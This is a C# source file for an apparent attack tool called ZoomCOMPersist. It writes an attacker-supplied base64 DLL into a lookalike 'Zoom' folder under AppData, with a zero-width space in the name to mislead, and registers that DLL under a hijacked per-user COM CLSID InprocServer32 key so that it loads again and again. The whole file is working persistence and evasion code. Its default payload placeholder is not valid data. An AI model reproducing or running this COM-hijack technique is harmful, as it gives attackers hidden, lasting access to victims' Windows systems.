using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace ZoomCOMPersist
{
    class Program
    {
        static void Main(string[] args)
        {
            string b64Bytes = "";
            string filePath = "";
            if (args.Length == 0)
            {
                Console.WriteLine("No base64 bytes provided. Writing default DLL to start new cmd.exe process.");
                //dll bytes. This will create new cmd.exe process
                b64Bytes = "asd";
            }
            else if (args.Length == 1)
            {
                b64Bytes = args[0].ToString();
            }
            else
            {
                Console.WriteLine("Incorrect number of arugments provided. Please provide base64 encoded DLL file. No argument will use the default DLL that starts a new cmd.exe process.");
            }


            //Create directory with include zero-width space
            try
            {
                filePath = Environment.GetEnvironmentVariable("appdata").ToString();
                filePath += "\\Zoom" + "\u200b";
                Directory.CreateDirectory(filePath);

                filePath += "\\bin";
                Directory.CreateDirectory(filePath);

                //write dll bytes to disk
                filePath += "\\zStartup.dll";
                File.WriteAllBytes(filePath, Convert.FromBase64String(b64Bytes));
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                System.Environment.Exit(1);
            }

            //create registry key for COM persistence
            try
            {
                RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\WOW6432Node\CLSID\", true);
                newkey.CreateSubKey(@"{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}");

                RegistryKey inprocKey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\WOW6432Node\CLSID\{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}", true);
                inprocKey.CreateSubKey("InprocServer32");

                RegistryKey setDLL = Registry.CurrentUser.OpenSubKey(@"Software\Classes\WOW6432Node\CLSID\{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}\InprocServer32", true);
                setDLL.SetValue("", filePath);
                setDLL.SetValue("ThreadingModel", "Both");

                newkey.Close();
                inprocKey.Close();
                setDLL.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
    }
}
